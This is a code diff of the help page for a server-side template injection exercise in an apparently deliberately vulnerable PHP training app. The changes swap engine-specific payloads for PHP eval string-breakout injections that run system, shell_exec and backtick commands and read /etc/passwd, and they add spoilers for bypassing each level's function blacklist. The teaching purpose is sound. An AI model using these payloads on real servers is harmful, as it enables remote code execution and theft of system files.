@@ -8,17 +8,17 @@
 					<h3>About</h3>
 					<p>Server-Side Template Injection (SSTI) is a vulnerability that occurs when user input is embedded into a template in an unsafe manner, allowing an attacker to inject template directives and potentially execute arbitrary code on the server.</p>
 					
-					<p>Template engines are designed to combine templates with data to produce dynamic web pages. When user input is concatenated directly into templates before rendering, attackers can break out of the template context and inject malicious template directives.</p>
+					<p>In this module, SSTI occurs when user input replaces template placeholders (like {{name}}) and the resulting template is evaluated as PHP code using eval(). This allows attackers to break out of the template context and inject malicious code.</p>
 
 					<h3>How SSTI Works</h3>
-					<p>Template engines process special syntax to:</p>
+					<p>Template engines use special syntax to:</p>
 					<ul>
-						<li>Display variables: <code>{{username}}</code></li>
+						<li>Display variables: <code>{{username}}</code> or <code>${username}</code></li>
 						<li>Execute expressions: <code>{{7*7}}</code></li>
 						<li>Call functions: <code>{{system('whoami')}}</code></li>
-						<li>Access objects: <code>{{request.application}}</code></li>
+						<li>Access objects: <code>{{_self}}</code> in Twig</li>
 					</ul>
-					<p>When user input is placed directly into these templates without proper sanitization, attackers can inject their own template syntax.</p>
+					<p>When user input replaces template variables and is then evaluated unsafely (e.g., with eval()), attackers can inject PHP code by breaking out of the string context.</p>
 
 					<h3>Common Template Engines</h3>
 					<ul>
@@ -30,24 +30,21 @@
 					</ul>
 
 					<h3>SSTI Payloads</h3>
-					<p><strong>Detection (Math expression):</strong></p>
-					<pre>{{7*7}}  // Should output 49 if vulnerable
-${7*7}
-&lt;%= 7*7 %&gt;</pre>
+					<p><strong>Detection (Breaking out of string context):</strong></p>
+					<pre>' . phpinfo() . '         # Break string and execute phpinfo
+' . 7*7 . '                # Test expression evaluation
+<?php phpinfo(); ?>       # Direct PHP tag injection</pre>
 
-					<p><strong>PHP (Twig/Native):</strong></p>
-					<pre>{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("whoami")}}
-${system('whoami')}
-&lt;?php system('whoami'); ?&gt;</pre>
+					<p><strong>PHP Code Injection via SSTI:</strong></p>
+					<pre>' . system('whoami') . '       # Execute OS commands
+' . `whoami` . '               # Backticks command execution
+' . file_get_contents('/etc/passwd') . '  # Read files
+' . print_r(scandir('.')) . '  # List directory</pre>
 
-					<p><strong>Python (Jinja2):</strong></p>
-					<pre>{{config.items()}}
-{{''.__class__.__mro__[1].__subclasses__()}}
-{{request.application.__globals__.__builtins__.__import__('os').popen('whoami').read()}}</pre>
-
-					<p><strong>Java (FreeMarker):</strong></p>
-					<pre>&lt;#assign ex="freemarker.template.utility.Execute"?new()&gt;${ex("whoami")}
-${"freemarker.template.utility.ObjectConstructor"?new()("java.lang.ProcessBuilder","whoami").start()}</pre>
+					<p><strong>Advanced Exploitation:</strong></p>
+					<pre>' . shell_exec('ls -la') . '   # Shell execution
+'; system('cat /etc/passwd'); $x=' # Multiple statements
+<?php echo `id`; ?>          # PHP tags with backticks</pre>
 
 					<h3>Impact</h3>
 					<ul>
@@ -63,29 +60,29 @@ ${"freemarker.template.utility.ObjectConstructor"?new()("java.lang.ProcessBuilde
 					<h3>Objective</h3>
 					<p>Your goal is to exploit the SSTI vulnerability to:</p>
 					<ul>
-						<li><strong>Low:</strong> Execute code using template syntax</li>
+						<li><strong>Low:</strong> Inject PHP code by breaking out of template string</li>
 						<li><strong>Medium:</strong> Bypass function name blacklist</li>
-						<li><strong>High:</strong> Bypass character filtering</li>
+						<li><strong>High:</strong> Bypass template syntax detection and extensive blacklist</li>
 						<li><strong>Impossible:</strong> Understand proper SSTI prevention</li>
 					</ul>
 
 					<br /><hr /><br />
 
 					<h3>Low Level</h3>
-					<p>The low level directly evaluates user input as part of the template using eval().</p>
-					<p><em>Spoiler:</em> <span class="spoiler">Try injecting PHP code like: ${system('whoami')} or ${phpinfo()} or &lt;?php echo exec('ls -la'); ?&gt;</span></p>
+					<p>The low level replaces {{name}} placeholder with user input and evaluates the result as PHP code using eval().</p>
+					<p><em>Spoiler:</em> <span class="spoiler">Break out of the string context using quotes and inject PHP code. Try: ' . phpinfo() . ' or ' . system('whoami') . ' or <?php echo `id`; ?></span></p>
 
 					<br />
 
 					<h3>Medium Level</h3>
-					<p>The medium level implements a basic blacklist blocking common dangerous functions.</p>
-					<p><em>Spoiler:</em> <span class="spoiler">Try using backticks for command execution: `whoami`, or file functions like: ${file_get_contents('/etc/passwd')}, or use print_r(scandir('.')).</span></p>
+					<p>The medium level implements a basic blacklist blocking: eval, exec, system, passthru, shell_exec, phpinfo, popen, proc_open, and PHP tags.</p>
+					<p><em>Spoiler:</em> <span class="spoiler">Blacklist blocks some functions but not all. Try backticks: ' . `whoami` . ' or file functions: ' . file_get_contents("/etc/passwd") . ' or ' . print_r(scandir(".")) . '</span></p>
 
 					<br />
 
 					<h3>High Level</h3>
-					<p>The high level blocks special characters commonly used in template syntax.</p>
-					<p><em>Spoiler:</em> <span class="spoiler">This level is difficult to bypass due to character filtering blocking {}, (), $, and other special chars. In real scenarios, encoding or alternative syntax might work depending on the template engine.</span></p>
+					<p>The high level blocks explicit template syntax ({{...}}) in user input and implements extensive blacklist including file operations, superglobals, and encoding functions.</p>
+					<p><em>Spoiler:</em> <span class="spoiler">Template syntax like {{}} is blocked, but you can still break the string. The template structure is: $user = '{{name}}'. Try: '; echo `whoami`; $x=' or use string concatenation: ' . `id` . ' (note: backticks and basic functions may still work if not in blacklist)</span></p>
 
 					<br />
 
@@ -120,12 +117,14 @@ ${"freemarker.template.utility.ObjectConstructor"?new()("java.lang.ProcessBuilde
 
 					<h3>Testing Tips</h3>
 					<ul>
-						<li><strong>Detect:</strong> Try math expressions: {{7*7}}, ${7*7}, &lt;%= 7*7 %&gt;</li>
-						<li><strong>Identify engine:</strong> Use specific syntax errors to fingerprint the engine</li>
-						<li><strong>Explore objects:</strong> Access global objects: {{config}}, {{request}}, {{self}}</li>
-						<li><strong>PHP wrappers:</strong> Use php://filter for file reading</li>
-						<li><strong>Environment leakage:</strong> Try {{_ENV}}, {{getenv}}</li>
-						<li><strong>Automation:</strong> Use tools like tplmap, SSTImap</li>
+						<li><strong>Detect:</strong> Try breaking string context: ' . phpinfo() . '</li>
+						<li><strong>String concatenation:</strong> Use ' . expression . ' to inject code</li>
+						<li><strong>Semicolon chains:</strong> '; expression; $x=' to execute multiple statements</li>
+						<li><strong>PHP tags:</strong> <?php code ?> if allowed</li>
+						<li><strong>Backticks:</strong> ' . `command` . ' for command execution</li>
+						<li><strong>Function discovery:</strong> ' . print_r(get_defined_functions()) . '</li>
+						<li><strong>Error messages:</strong> Trigger errors to reveal template structure</li>
+						<li><strong>Encoding:</strong> Try base64, URL encoding if not blacklisted</li>
 					</ul>
 
 					<br />
